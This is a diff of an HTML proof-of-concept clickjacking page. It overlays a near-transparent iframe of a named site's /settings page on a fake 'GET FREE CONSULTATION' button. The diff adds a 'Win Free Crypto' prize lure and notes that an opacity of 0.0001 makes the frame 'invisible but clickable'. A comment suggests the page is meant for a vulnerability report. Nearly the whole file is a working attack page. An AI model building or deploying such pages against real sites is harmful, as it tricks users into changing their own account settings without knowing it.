@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title></title>
+    <title>Win Free Crypto!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: rgba(255, 255, 255, 0.1);
+            background-color: #f4f4f9;
             margin: 0;
             padding-top: 100px;
         }
@@ -19,7 +19,7 @@
             left: 50%;
             transform: translateX(-50%);
             padding: 20px 40px;
-            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+            background-color: #28a745;
             color: white;
             font-size: 24px;
             font-weight: bold;
@@ -31,7 +31,7 @@
         }
 
         .fake-button:hover {
-            background: linear-gradient(135deg, #218838 0%, #155724 100%);
+            background-color: #218838;
         }
 
         /* 2. The Target Application (The Trap) */
@@ -44,7 +44,7 @@
             
             /* CRITICAL: Set to 0.5 for testing alignment. 
                Set to 0.0001 for the final report to make it invisible but clickable. */
-            opacity: 0.0001; 
+            opacity: 0.5; 
             
             z-index: 2; /* Sits directly ON TOP of the fake button */
             border: none;
@@ -53,9 +53,12 @@
 </head>
 <body>
 
+    <h1>🎉 You've Won a Special Prize! 🎉</h1>
+    <p>Click the button below to claim it immediately.</p>
+
     <button class="fake-button">GET FREE CONSULTATION</button>
 
-    <iframe class="target-iframe" src="https://tavron.net/contact.html"></iframe>
+    <iframe class="target-iframe" src="https://tavron.net/settings"></iframe>
 
 </body>
 </html>
